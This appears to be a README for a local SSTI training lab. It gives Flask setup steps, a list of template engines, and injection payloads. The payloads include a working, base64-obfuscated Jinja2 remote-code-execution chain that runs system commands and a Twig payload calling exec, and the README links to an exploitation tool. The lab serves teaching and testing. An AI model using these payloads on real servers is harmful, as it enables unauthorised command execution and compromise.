# Requirements:

* apt-get install python
* apt-get install python-pip
* pip install flask
* pip install jinja2

# Steps:
* Download lab file 
* export FLASK_APP=ssti-lab.py
* flask run
* http://127.0.0.1:5000

# Original Blog:
https://portswigger.net/research/server-side-template-injection

# Web Template Engines:

* FreeMarker - Java-based template engine
* Velocity - Java-based template engine
* Smarty - PHP Template engine
* Twig - PHP Template engine
* Jade - Node.js Template engine
* Jinja2 - Python/Flask Template engine

# Basic Payload:

* `{{7*7}}`
* `{{7*'7'}}`

# RCE PAYLOAD - JINJA2:
`{{5096754695}}{{''}}{%+set+d+=+"eval(__import__('base64').urlsafe_b64decode('X19pbXBvcnRfXygnb3MnKS5wb3BlbihfX2ltcG9ydF9fKCdiYXNlNjQnKS51cmxzYWZlX2I2NGRlY29kZSgnZFc1aGJXVWdMV0U9JykuZGVjb2RlKCkpLnJlYWQoKQ=='))"+%}{%+for+c+in+[].__class__.__base__.__subclasses__()+%}+{%+if+c.__name__+==+'catch_warnings'+%}
{%+for+b+in+c.__init__.__globals__.values()+%}+{%+if+b.__class__+==+{}.__class__+%}
{%+if+'eval'+in+b.keys()+%}
{{+b['eval'](d)+}}
{%+endif+%}+{%+endif+%}+{%+endfor+%}
{%+endif+%}+{%+endfor+%}{{''}}{{9776394213}}`

Note: Decode decode base64 string to to place system commands

# RCE PAYLOAD - TWIG:
`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`

# Automation tool for SSTI exploitation:
[TPLMap](https://github.com/epinna/tplmap)
